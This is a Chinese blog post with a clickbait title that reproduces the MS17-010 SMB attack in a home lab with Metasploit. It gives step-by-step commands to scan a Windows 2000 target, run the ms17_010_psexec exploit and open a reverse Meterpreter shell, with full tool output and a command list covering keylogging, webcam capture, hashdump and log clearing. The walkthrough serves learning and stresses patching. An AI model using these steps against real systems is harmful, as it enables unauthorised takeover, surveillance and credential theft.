# 震惊！16岁男子竟然在家里做出这种事！


<!--more-->
## 简介

该男子居然在家做出这种事情，使多数人震惊！
## 这才是真正的简介

哈哈，上面那个是假的，本篇博客将会复现MS17-010漏洞攻击。

### MS17-010是啥啊？

你是否记得2017年的那个勒索病毒？就是不给钱就把你电脑里所有的AV加密起来的一个病毒。是不是很可怕？这个病毒就是通过这个漏洞让更多的人看不到AV的。

* 那这个漏洞是怎样的呢？我将给出以下链接用于参考：
>
> [Microsoft 安全公告 MS17-010 - 严重](https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010)
>
> [https://cvedetails.com/cve/CVE-2017-0143/](https://cvedetails.com/cve/CVE-2017-0143/)
>
> [https://cvedetails.com/cve/CVE-2017-0144/](https://cvedetails.com/cve/CVE-2017-0144/)
>
> [https://cvedetails.com/cve/CVE-2017-0145/](https://cvedetails.com/cve/CVE-2017-0145/)
>
> [https://cvedetails.com/cve/CVE-2017-0146/](https://cvedetails.com/cve/CVE-2017-0146/)
>
> [https://cvedetails.com/cve/CVE-2017-0147/](https://cvedetails.com/cve/CVE-2017-0147/)
>
> [https://cvedetails.com/cve/CVE-2017-0148/](https://cvedetails.com/cve/CVE-2017-0148/)
>
> [https://github.com/RiskSense-Ops/MS17-010](https://github.com/RiskSense-Ops/MS17-010)
>

## 攻击复现

那么，我们来复现一下这个漏洞的攻击流程吧。在这里，我给大家安利一个[Linux](https://baike.baidu.com/item/linux/27050?fr=aladdin)的渗透测试软件包。叫做**Metasploit**。 它在作为**渗透测试的发行版**中是自带的，如果你用的不是**作为渗透测试的发行版**，那么以下是安装方法：

* 基于Arch
```bash
$ sudo pacman -S metasploit
```
* 基于Debian更新源里有的
```bash
$ sudo apt-get install metasploit
```
* rpm系或deb系源里没有的
```bash
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
```

```bash
$ sudo chmod 755 msfinstall && ./msfinstall
```
* Windows嘛….

> 两个选择
>
>   * 请到[MSF官网](https://www.metasploit.com/)下载，并且耐心等待。
>   * [出门左转](/posts/linux_mint_安装教程/)安装Linux

## 复现过程
>
> 重要的事情说三遍：
>
> 接下来就是最重要的一部分，你一定要认真看！认真看！认真看！
>

### 攻击环境
||攻击机|靶机|
|:-:|:-:|:-:|
|操作系统|Arch Linux|Windows2K|
|IP地址|192.168.42.141|192.168.42.252|

靶机截图:

![](/img/截图_2019-07-26_21-57-01.png)

### 攻击过程

首先，攻击机打开终端，输入 **`msfconsole`** ，并按回车等待。

```bash
$ sudo msfconsole
```

建议加上`sudo`，以免出现未知错误。

稍等片刻，metasploit就打开了。如图

![](/img/截图_2019-07-26_22-04-07.png)

接下来，通过 **`search`** 命令本次要利用到的MS17_010模块
```bash
msf5 > search ms17_010
```
然后就跳出一大堆
```txt
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
```
嘛，我们先检测一下靶机是否存在这个漏洞，选第二个漏洞检测模块。

```bash
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```

---
>
>顺便一提，metasploit是一款渗透测试工具，如果你想了解这些模块是怎么运作的，那么你要掌握这几条命令：
>
>1. search
>  * 用于搜素模块，然后列出这个模块使用方式，如上面演示的一样。
>2. info
>  * 显示该模块的详细信息。
>3. show + [option]
>  * 显示该模块的部分信息。
>4. show options
>  * 显示该模块需要设置的项目
>5. show payloads
>  * 显示该模块可使用的攻击载荷
>
>**注意，第三条和第四条不要搞混了，第二条那个[option]是指代。**
>

---

回归正题，我们先看看这个模块的信息。
```bash
msf5 auxiliary(scanner/smb/smb_ms17_010) > info
```
然后又出了一大堆qwq…
```txt
    Name: MS17-010 SMB RCE Detection
     Module: auxiliary/scanner/smb/smb_ms17_010
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Sean Dillon <sean.dillon@risksense.com>
  Luke Jennings

Check supported:
  Yes

Basic options:
  Name         Current Setting                                 Required  Description
  ----         ---------------                                 --------  -----------
  CHECK_ARCH   true                                            no        Check for architecture on vulnerable hosts
  CHECK_DOPU   true                                            no        Check for DOUBLEPULSAR on vulnerable hosts
  CHECK_PIPE   false                                           no        Check for named pipe on vulnerable hosts
  NAMED_PIPES  /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
  RHOSTS                                                       yes       The target address range or CIDR identifier
  RPORT        445                                             yes       The SMB service port (TCP)
  SMBDomain    .                                               no        The Windows domain to use for authentication
  SMBPass                                                      no        The password for the specified username
  SMBUser                                                      no        The username to authenticate as
  THREADS      1                                               yes       The number of concurrent threads

Description:
  Uses information disclosure to determine if MS17-010 has been 
  patched or not. Specifically, it connects to the IPC$ tree and 
  attempts a transaction on FID 0. If the status returned is 
  "STATUS_INSUFF_SERVER_RESOURCES", the machine does not have the 
  MS17-010 patch. If the machine is missing the MS17-010 patch, the 
  module will check for an existing DoublePulsar (ring 0 
  shellcode/malware) infection. This module does not require valid SMB 
  credentials in default server configurations. It can log on as the 
  user "\" and connect to IPC$.

References:
  https://cvedetails.com/cve/CVE-2017-0143/
  https://cvedetails.com/cve/CVE-2017-0144/
  https://cvedetails.com/cve/CVE-2017-0145/
  https://cvedetails.com/cve/CVE-2017-0146/
  https://cvedetails.com/cve/CVE-2017-0147/
  https://cvedetails.com/cve/CVE-2017-0148/
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
  https://github.com/countercept/doublepulsar-detection-script
  https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Also known as:
  DOUBLEPULSAR
  ETERNALBLUE
```

然而这里我们只需要看那个**Basic options**部分就可以了，那两行有yes的，我们就知道了，我们需要指定一个**目标IP(RHOST)**，而那个 **RPORT(目标端口)** 已经被指定为445了。

接下来执行…
```bash
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhost 192.168.42.252
msf5 auxiliary(scanner/smb/smb_ms17_010) > run
```
返回后我们得到了这些
```bash 
[+] 192.168.42.252:445    - Host is likely VULNERABLE to MS17-010! - Windows 5.0 x86 (32-bit)
[*] 192.168.42.252:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

![](/img/截图_2019-07-26_22-57-39.png)
说明目标是存在MS17_010漏洞的，那么我们接下来将要使用的是攻击模块，也就是上面搜索到的最后一个。
> exploit/windows/smb/ms17_010_psexec

那么，执行
```bash
msf5 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_psexec
```
接下来msf5后面的模块就变成了攻击模块了。
![](/img/截图_2019-07-26_23-01-45.png)
然后继续执行info，没错，又会弹出一大堆。

```bash
msf5 exploit(windows/smb/ms17_010_psexec) > info
```

对，就是下面这一大堆。
```txt
       Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     Module: exploit/windows/smb/ms17_010_psexec
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2017-03-14

Provided by:
  sleepya
  zerosum0x0
  Shadow Brokers
  Equation Group

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   PowerShell
  2   Native upload
  3   MOF upload

Check supported:
  Yes

Basic options:
  Name                  Current Setting                                 Required  Description
  ----                  ---------------                                 --------  -----------
  DBGTRACE              false                                           yes       Show extra debug trace info
  LEAKATTEMPTS          99                                              yes       How many times to try to leak transaction
  NAMEDPIPE                                                             no        A named pipe that can be connected to (leave blank for auto)
  NAMED_PIPES           /opt/metasploit/data/wordlists/named_pipes.txt  yes       List of named pipes to check
  RHOSTS                                                                yes       The target address range or CIDR identifier
  RPORT                 445                                             yes       The Target port
  SERVICE_DESCRIPTION                                                   no        Service description to to be used on target for pretty listing
  SERVICE_DISPLAY_NAME                                                  no        The service display name
  SERVICE_NAME                                                          no        The service name
  SHARE                 ADMIN$                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
  SMBDomain             .                                               no        The Windows domain to use for authentication
  SMBPass                                                               no        The password for the specified username
  SMBUser                                                               no        The username to authenticate as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to 
  achieve a write-what-where primitive. This will then be used to 
  overwrite the connection session information with as an 
  Administrator session. From there, the normal psexec payload code 
  execution is done. Exploits a type confusion between Transaction and 
  WriteAndX requests and a race condition in Transaction requests, as 
  seen in the EternalRomance, EternalChampion, and EternalSynergy 
  exploits. This exploit chain is more reliable than the EternalBlue 
  exploit, but requires a named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://cvedetails.com/cve/CVE-2017-0143/
  https://cvedetails.com/cve/CVE-2017-0146/
  https://cvedetails.com/cve/CVE-2017-0147/
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE
```

看到这么一大堆，你也不用紧张，其实跟上面的一样，你只需要设置四个东西

* RHOST，目标IP，目标的DHCP地址
*  LHOST，监听IP，一般是你自己的DHCP地址
* LPORT，监听端口，随便写一个，只要没冲突就行。比如我是Arch Linux，默认全端口关闭，我可以随便写。
* payload，攻击载荷，一般是 windows/meterpreter/reverse_tcp ，你也可以用别的，想看看还有什么能用就执行 show payloads 吧。

接下来就设置这四个东西吧。

```bash
msf5 exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.42.141
```

```bash
msf5 exploit(windows/smb/ms17_010_psexec) > set LPORT 6666
```

```bash
msf5 exploit(windows/smb/ms17_010_psexec) > set RHOST 192.168.42.252
```

```bash
msf5 exploit(windows/smb/ms17_010_psexec) > set payloads windows/meterpreter/reverse_tcp
```

设置完以后执行 **`run`** 或者 **`exploit`** ，其实二者并没有什么区别，都是一样的。

喜欢哪个就用哪个吧。

```bash
msf5 exploit(windows/smb/ms17_010_psexec) > run
```

好啦，如果没有问题，然后返回一下内容，那么就说明攻击成功了。

```bash
[*] Started reverse TCP handler on 192.168.42.141:6666 
[*] 192.168.42.252:445 - Target OS: Windows 5.0
[*] 192.168.42.252:445 - Filling barrel with fish... done
[*] 192.168.42.252:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.42.252:445 - 	[*] Preparing dynamite...
[*] 192.168.42.252:445 - 		[*] Trying stick 1 (x86)...Boom!
[*] 192.168.42.252:445 - 	[+] Successfully Leaked Transaction!
[*] 192.168.42.252:445 - 	[+] Successfully caught Fish-in-a-barrel
[*] 192.168.42.252:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 192.168.42.252:445 - Reading from CONNECTION struct at: 0x81382010
[*] 192.168.42.252:445 - Built a write-what-where primitive...
[+] 192.168.42.252:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.42.252:445 - Selecting native target
[*] 192.168.42.252:445 - Uploading payload... JmgBrDpV.exe
[*] 192.168.42.252:445 - Created \JmgBrDpV.exe...
[+] 192.168.42.252:445 - Service started successfully...
[*] 192.168.42.252:445 - Deleting \JmgBrDpV.exe...
[*] Sending stage (179779 bytes) to 192.168.42.252
[*] Meterpreter session 1 opened (192.168.42.141:6666 -> 192.168.42.252:1027) at 2019-07-26 23:11:38 +0800

meterpreter >
```

截一张图吧
![](/img/截图_2019-07-26_23-12-50.png)
接下来就可以进行你想干的事情了，而现在干的事情叫做后渗透。后渗透相当复杂，这里就不多讲了。

那么至少可以干点什么呢，执行
```bash
meterpreter > help
```

就可以看到帮助文档了。

```txt
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play an audio file on target system, nothing written on disk


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes
```

嘛，返回来的很多是吧，这几个比较常用

**`cd`**、**`ls`**、**`shell`**、**`cat`**

懂Linux的人基本上都知道了，这里不多做解释了。

## 小结

首先本篇博客仅作为测试用途，请勿将其用于违法用途。

其次，ms17-010这类的漏洞都是十分危险的，Windows用户一定要注意及时更新，打好补丁，不要给坏人可乘之机，最好是干脆直接日用Linux，windows仅用于娱乐即可。

然后这篇博客也带有很多水的成分，谢谢浏览。
